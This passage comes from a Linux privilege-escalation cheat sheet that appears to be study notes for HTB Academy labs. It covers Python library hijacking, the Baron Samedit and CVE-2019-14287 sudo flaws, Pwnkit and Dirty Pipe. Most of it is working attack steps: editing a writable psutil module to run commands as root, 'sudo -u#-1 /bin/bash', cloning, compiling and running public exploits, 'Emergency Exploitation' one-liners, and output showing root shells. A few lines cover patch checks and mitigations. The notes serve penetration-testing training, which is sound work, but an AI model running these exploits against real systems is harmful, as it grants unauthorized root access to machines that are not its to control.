# import psutil
# available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

# 3. Check sudo permissions
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

# 4. Find writable psutil module
grep -r "def virtual_memory*" /usr/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--r-- 1 htb-student staff 87657 Jun 8 09:21

# 5. Edit psutil module
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# In virtual_memory() function, add:
# import os
# os.system('cat /root/flag.txt')

# 6. Execute for flag
sudo /usr/bin/python3 /home/htb-student/mem_status.py
# Result: HTB{...
```

### 🔧 Common Python Modules to Target

#### Frequently Imported Modules

```
# Common targets for hijacking
os, sys, subprocess, socket
requests, urllib, json
psutil, pandas, numpy
flask, django, tornado
```

#### Module Discovery in Scripts

```
# Extract imports from Python scripts
grep -E "^import |^from .* import" script.py

# Find all Python scripts and their imports
find / -name "*.py" -exec grep -l "import" {} \; 2>/dev/null
```

_Python library hijacking exploits the module import system - writable library paths, path precedence, and environment variable manipulation can redirect imports to malicious code for privilege escalation._

***

***

## Sudo

Known sudo vulnerabilities provide direct privilege escalation through heap buffer overflow (Baron Samedit) and policy bypass exploits affecting specific sudo versions.

### 🔥 CVE-2021-3156 (Baron Samedit)

#### Vulnerability Details

* **Impact**: Heap-based buffer overflow → root shell
* **Affected Versions**:
  * 1.8.31 (Ubuntu 20.04)
  * 1.8.27 (Debian 10)
  * 1.9.2 (Fedora 33)
* **Existed**: Over 10 years undetected

#### Version Check

```
# Check sudo version
sudo -V | head -n1
# Sudo version 1.8.31

# Check OS version
cat /etc/lsb-release
# DISTRIB_RELEASE=20.04
```

#### Exploitation

```
# 1. Download Baron Samedit exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156

# 2. Compile exploit
make

# 3. Check available targets
./sudo-hax-me-a-sandwich
# 0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
# 1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
# 2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28

# 4. Execute with target ID
./sudo-hax-me-a-sandwich 1  # For Ubuntu 20.04
# Result: root shell
```

### 🔓 CVE-2019-14287 (Sudo Policy Bypass)

#### Vulnerability Details

* **Impact**: User ID bypass → privilege escalation
* **Affected**: All versions below 1.8.28
* **Method**: Negative user ID (-1) processed as UID 0 (root)

#### Prerequisites

Copy

```
# Need sudo access to any command
sudo -l
# User may run: (ALL) /usr/bin/id
```

#### Exploitation

```
# Check user ID
cat /etc/passwd | grep $(whoami)
# user:x:1005:1005:user,,,:/home/user:/bin/bash

# Execute with negative ID
sudo -u#-1 id
# uid=0(root) gid=1005(user) groups=1005(user)

# Get full root shell
sudo -u#-1 /bin/bash
```

#### HTB Academy Lab Example (CVE-2019-14287)

```
# 1. Connect to target
ssh htb-student@target

# 2. Check sudo permissions
bash -i
sudo -l
# User htb-student may run the following commands:
#     (ALL, !root) /bin/ncdu

# 3. Check ncdu manual for exploitation
man -P cat ncdu | grep -A 5 "b   Spawn shell"
# Option 'b' spawns shell in current directory

# 4. Execute with negative user ID
sudo -u#-1 /bin/ncdu
# Press 'b' in ncdu interface

# 5. Get root shell and read flag
id  # uid=0(root)
cat /root/flag.txt
```

### 🔍 Version Enumeration

#### Sudo Version Check

```
# Basic version check
sudo -V | head -n1

# Detailed version info
sudo -V | grep -E "(version|release)"

# Check for specific vulnerable versions
sudo -V | grep -E "(1\.8\.(31|27|21)|1\.9\.2)"
```

#### OS Version Correlation

```
# Ubuntu version
cat /etc/lsb-release
lsb_release -a

# Debian version
cat /etc/debian_version

# Generic OS info
cat /etc/os-release
```

### 🚀 Quick Exploitation

#### CVE-2021-3156 Quick Check

```
#!/bin/bash
version=$(sudo -V 2>/dev/null | head -n1 | grep -oE "[0-9]+\.[0-9]+\.[0-9]+")
if echo "$version" | grep -qE "(1\.8\.(31|27|21)|1\.9\.[0-2])"; then
    echo "[!] VULNERABLE to CVE-2021-3156: $version"
    echo "Download: https://github.com/blasty/CVE-2021-3156.git"
fi
```

#### CVE-2019-14287 Quick Check

```
#!/bin/bash
version=$(sudo -V 2>/dev/null | head -n1 | grep -oE "[0-9]+\.[0-9]+\.[0-9]+")
if sudo -l >/dev/null 2>&1; then
    if echo "$version" | grep -qE "1\.[0-7]\.|1\.8\.(0|1[0-9]|2[0-7])"; then
        echo "[!] VULNERABLE to CVE-2019-14287: $version"
        echo "Exploit: sudo -u#-1 /bin/bash"
    fi
fi
```

### 🔧 Exploitation Scripts

#### Baron Samedit Automation

```
#!/bin/bash
echo "=== CVE-2021-3156 BARON SAMEDIT CHECK ==="

version=$(sudo -V 2>/dev/null | head -n1 | grep -oE "[0-9]+\.[0-9]+\.[0-9]+")
echo "Sudo version: $version"

if echo "$version" | grep -qE "(1\.8\.(31|27|21)|1\.9\.[0-2])"; then
    echo "[!] VULNERABLE to CVE-2021-3156"
    
    if [ ! -d "CVE-2021-3156" ]; then
        echo "[+] Downloading exploit..."
        git clone https://github.com/blasty/CVE-2021-3156.git
        cd CVE-2021-3156 && make
    fi
    
    echo "[+] Available exploit targets:"
    ./CVE-2021-3156/sudo-hax-me-a-sandwich 2>/dev/null || echo "Compile first with 'make'"
else
    echo "[-] Not vulnerable to CVE-2021-3156"
fi
```

#### Policy Bypass Test

```
#!/bin/bash
echo "=== CVE-2019-14287 POLICY BYPASS CHECK ==="

if sudo -l >/dev/null 2>&1; then
    echo "[+] Sudo access available"
    version=$(sudo -V 2>/dev/null | head -n1 | grep -oE "[0-9]+\.[0-9]+\.[0-9]+")
    
    if echo "$version" | grep -qE "1\.[0-7]\.|1\.8\.(0|1[0-9]|2[0-7])"; then
        echo "[!] VULNERABLE to CVE-2019-14287: $version"
        echo "[+] Testing exploit:"
        echo "sudo -u#-1 id"
    else
        echo "[-] Not vulnerable to CVE-2019-14287"
    fi
else
    echo "[-] No sudo access"
fi
```

### 🔑 Quick Reference

#### Immediate Checks

```
# Version vulnerability check
sudo -V | grep -E "(1\.8\.(31|27|21)|1\.9\.[0-2])"  # CVE-2021-3156
sudo -V | grep -E "1\.[0-7]\.|1\.8\.(0|1[0-9]|2[0-7])"  # CVE-2019-14287

# Sudo access check
sudo -l
```

#### Emergency Exploitation

```
# CVE-2019-14287 (if vulnerable version + sudo access)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (if vulnerable version)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich 1  # Ubuntu 20.04
```

#### Alternative Exploits

```
# Other CVE-2021-3156 exploits
# https://github.com/worawit/CVE-2021-3156
# https://github.com/stong/CVE-2021-3156

# Automated exploitation tools
# https://github.com/lockedbyte/CVE-Exploits
```

### ⚠️ Exploit Considerations

#### CVE-2021-3156 Notes

* **Compilation required** on target or similar system
* **OS-specific targets** - must match exact version
* **Heap manipulation** - may cause crashes if wrong target
* **Success varies** based on system configuration

#### CVE-2019-14287 Notes

* **Simple exploitation** - one command
* **Requires sudo access** to any command
* **Limited impact** - only vulnerable versions
* **Well-patched** in modern systems

_Sudo CVE exploits provide direct privilege escalation for specific vulnerable versions - Baron Samedit and Policy Bypass represent critical sudo vulnerabilities requiring immediate patching._

***

***

## Polkit/Pwnkit

### 🎯 Overview

Polkit (PolicyKit) authorization service vulnerability CVE-2021-4034 "Pwnkit" allows local privilege escalation through pkexec memory corruption, affecting most Linux distributions.

### 🚨 CVE-2021-4034 (Pwnkit)

#### Vulnerability Details

* **Impact**: Memory corruption in pkexec → immediate root shell
* **Affected**: Most Linux distributions with polkit
* **Hidden**: Over 10 years undetected (published Nov 2021)
* **Requirement**: None - any local user can exploit

#### Version Check

```
# Check pkexec availability
which pkexec
pkexec --version

# Check polkit version
apt list --installed | grep polkit
rpm -qa | grep polkit
```

### 🚀 Exploitation

#### Download and Compile Pwnkit

```
# Download exploit
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034

# Compile exploit
gcc cve-2021-4034-poc.c -o poc

# Execute for immediate root
./poc
# Result: root shell
```

#### Alternative Exploits

```
# Other Pwnkit implementations
git clone https://github.com/berdav/CVE-2021-4034.git
git clone https://github.com/joeammond/CVE-2021-4034-PoC.git
git clone https://github.com/Almorabea/Polkit-exploit.git
```

### 🔧 Manual Exploitation

#### Understanding the Vulnerability

```
# Normal pkexec usage
pkexec -u root id
# uid=0(root) gid=0(root) groups=0(root)

# Vulnerability in argument processing
# Memory corruption when pkexec processes argv[0]
```

#### DIY Exploit (Advanced)

Copy

```
# Basic exploitation concept
# 1. Exploit argv[0] handling in pkexec
# 2. Trigger memory corruption
# 3. Control execution flow
# 4. Execute arbitrary code as root
```

### 🔍 Detection & Enumeration

#### Polkit Vulnerability Check

```
#!/bin/bash
echo "=== POLKIT/PWNKIT VULNERABILITY CHECK ==="

echo "[+] pkexec availability:"
which pkexec 2>/dev/null && echo "pkexec found - potential CVE-2021-4034"

echo "[+] Polkit version:"
apt list --installed 2>/dev/null | grep polkit
rpm -qa 2>/dev/null | grep polkit

echo "[+] pkexec version:"
pkexec --version 2>/dev/null

echo "[+] Quick vulnerability test:"
if which pkexec >/dev/null 2>&1; then
    echo "[!] LIKELY VULNERABLE - pkexec present"
    echo "Download: https://github.com/arthepsy/CVE-2021-4034.git"
fi
```

#### System Information

```
# Check Linux distribution
cat /etc/os-release
cat /etc/lsb-release

# Check polkit service
systemctl status polkit
ps aux | grep polkit
```

### 🔑 Quick Reference

#### Immediate Checks

```
# Check for pkexec
which pkexec

# Test basic functionality
pkexec -u root id  # If works, likely vulnerable to CVE-2021-4034
```

#### Emergency Exploitation

```
# Quick Pwnkit exploitation
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc  # Immediate root shell
```

#### HTB Academy Example

```
# 1. Connect to target
ssh htb-student@target

# 2. Check for pkexec
which pkexec

# 3. Download and compile Pwnkit
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# 4. Execute for root
./poc
# Get root shell

# 5. Read flag
cat /root/flag.txt
```

### ⚠️ Exploit Characteristics

#### Pwnkit Advantages

* **Universal impact** - Works on most Linux distributions
* **No prerequisites** - Any local user can exploit
* **Reliable exploitation** - High success rate
* **Silent execution** - Minimal system logs

#### Limitations

* **Compilation required** - Need gcc on target or transfer binary
* **Patched systems** - Fixed in updated polkit versions
* **Detection possible** - Modern EDR may detect exploitation

### 🛡️ Defensive Measures

#### Patch Status Check

```
# Check if polkit is updated
apt list --upgradable | grep polkit
dnf check-update polkit

# Verify patch level
pkexec --version | grep -E "(0\.105|0\.117|0\.118|0\.119|0\.120)"  # Vulnerable
```

#### Mitigation Options

```
# Remove pkexec if not needed
sudo chmod 0755 /usr/bin/pkexec  # Remove SUID

# Monitor pkexec usage
auditctl -w /usr/bin/pkexec -p x -k pwnkit_usage
```

_Pwnkit (CVE-2021-4034) represents one of the most significant Linux privilege escalation vulnerabilities - any local user can exploit polkit's pkexec for immediate root access on unpatched systems._

***

***

## Dirty Pipe

Dirty Pipe (CVE-2022-0847) is a Linux kernel vulnerability affecting versions **5.8 through 5.16.10, 5.15.24, and 5.10.101**. It allows an unprivileged local user to write arbitrary data to any file on the system, provided they have read permissions on that file, bypassing file system permissions.

**Theoretical Mechanics: How Dirty Pipe Works**

The vulnerability stems from an uninitialized flag in the Linux kernel's implementation of dynamic memory management for pipes and the page cache.

* **Pipes and Buffers:** A Linux pipe is a mechanism for inter-process communication organized into circular ring buffers (`pipe_buffer`).
* **Page Cache Integration:** When reading files, Linux caches file contents in memory pages (the **Page Cache**). The `splice()` system call allows processes to transfer data from a file's page cache directly into a pipe without copying data to user space.
* **The Flag (`PIPE_BUF_FLAG_CAN_MERGE`):** This flag tells the kernel that new data written to a pipe can be appended directly into the existing buffer page if space permits.
* **The Vulnerability Flaw:** When `splice()` pushed page cache references into a pipe, the kernel failed to clear the `PIPE_BUF_FLAG_CAN_MERGE` flag on the pipe buffer. As a result:
  1. An attacker writes arbitrary data to a pipe to set the `PIPE_BUF_FLAG_CAN_MERGE` flag on all ring buffers.
  2. The attacker drains the pipe (reads all data out).
  3. The attacker calls `splice()` on a read-only file (such as `/etc/passwd` or an executable binary). This populates the pipe buffer with references to the file's page cache, but leaves `PIPE_BUF_FLAG_CAN_MERGE` active.
  4. The attacker writes to the pipe again. Because the merge flag is active, the kernel writes the new data directly into the underlying **Page Cache page** of the read-only file.

The execution of the Dirty Pipe exploit (CVE-2022-0847) involves specific Linux commands and expected terminal outputs at each phase of the attack chain.

**1. Kernel Version Verification**

Bash

```
uname -r
```

Output:

Plaintext

```
5.13.0-46-generic
```

* **Command:** `uname -r` prints the active kernel release string.
* **Analysis:** Kernel `5.13.0-46` falls within the vulnerable window (5.8 through 5.16.10). This confirms the kernel's pipe buffer handling lacks the proper initialization fix for the `PIPE_BUF_FLAG_CAN_MERGE` flag.

**2. Downloading Exploit Source Code**

Bash

```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
```

Output:

Plaintext

```
Cloning into 'CVE-2022-0847-DirtyPipe-Exploits'...
remote: Enumerating objects: 31, done.
remote: Counting objects: 100% (31/31), done.
Receiving objects: 100% (31/31), 14.25 KiB | 2.85 MiB/s, done.
Resolving deltas: 100% (12/12), done.
```

* **Command:** `git clone` downloads the repository containing C source files, and `cd` moves the active session into the project folder.
* **Analysis:** Retrieves the raw source code (`exploit-1.c` and `exploit-2.c`) to be built on the target architecture.

**3. Compiling the C Binaries**

Bash

```
bash compile.sh
```

Output:

Plaintext

```
Compiling exploit-1.c -> exploit-1
Compiling exploit-2.c -> exploit-2
Compilation finished successfully.
```

* **Command:** Runs a build script that calls the GNU C Compiler (`gcc`) to build the source code into native ELF executables.
* **Analysis:** Converts C code into machine-executable binaries (`exploit-1` and `exploit-2`) capable of making low-level system calls (`splice()`, `open()`, `pipe()`).

**4. Overwriting `/etc/passwd` Cache (Exploit Method 1)**

Bash

```
./exploit-1
```

Output:

Plaintext

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

# id
uid=0(root) gid=0(root) groups=0(root)
```

* **Command:** Executes the compiled `exploit-1` binary.
* **Analysis:**
  1. The binary opens `/etc/passwd` (which is read-only for standard users) and uses `splice()` to push its pages into a prepared pipe buffer.
  2. It writes new password hash bytes into the pipe, directly overwriting the root user entry in the kernel's **Page Cache**.
  3. The exploit prompts for authentication using the new password (`piped`) and spawns a root shell (`uid=0`).

**5. Locating Target SUID Binaries**

Bash

```
find / -perm -4000 2>/dev/null
```

Output:

Plaintext

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/su
```

* **Command:** `find /` scans the filesystem, `-perm -4000` filters for Set-UID binaries, and `2>/dev/null` suppresses permission errors.
* **Analysis:** Identifies SUID executables owned by `root`. Any executable file on this list can serve as a target for binary memory hijacking.

**6. Hijacking SUID Binary Execution (Exploit Method 2)**

Bash

```
./exploit-2 /usr/bin/sudo
```

Output:

Plaintext

```
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),27(sudo),1000(cry0l1t3)
```

* **Command:** Runs `exploit-2` passing the target SUID binary path (`/usr/bin/sudo`) as an argument.
* **Analysis:**
  1. **Hijack:** The exploit overwrites the executable code of `/usr/bin/sudo` in page cache memory with shellcode that creates an elevated executable (e.g., `/tmp/sh`).
  2. **Execution:** Running `/usr/bin/sudo` triggers the modified memory space, executing the code with `root` privileges.
  3. **Restoration:** The exploit rewrites the original binary instructions back to page cache to prevent crashing system utilities or leaving obvious system corruption behind.

***

***
